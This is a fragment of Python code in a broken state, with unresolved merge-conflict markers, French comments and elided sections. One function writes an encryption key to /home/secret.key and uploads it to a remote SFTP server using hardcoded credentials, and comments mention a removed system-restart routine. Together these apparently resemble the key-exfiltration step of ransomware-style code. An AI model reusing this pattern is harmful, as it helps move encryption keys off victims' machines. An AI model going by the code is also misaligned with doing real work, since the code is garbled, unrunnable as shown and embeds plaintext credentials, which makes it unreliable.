...
<<<<<<< HEAD
def send_key_to_sftp():
    sftp_host = "192.168.45.103"
    sftp_port = 22
    sftp_username = "user sftp"
    sftp_password = "mot de passe user"
    remote_path = "/home/sftuser/secret.key"
=======
def load_key():
    """Charge la clé de chiffrement."""
    return open("/home/secret.key", "rb").read()
...
>>>>>>> parent of 13b894a (new 6)
    try:
        ...
        with open("/home/secret.key", "wb") as f:
            f.write(key)
        # Envoi du fichier vers le serveur SFTP
        sftp.put("/home/secret.key", remote_path)
        sftp.close()
        transport.close()
...
# Fonction de redémarrage du système supprimée
...
if __name__ == "__main__":
    ...
    # Appel de restart_system() supprimé
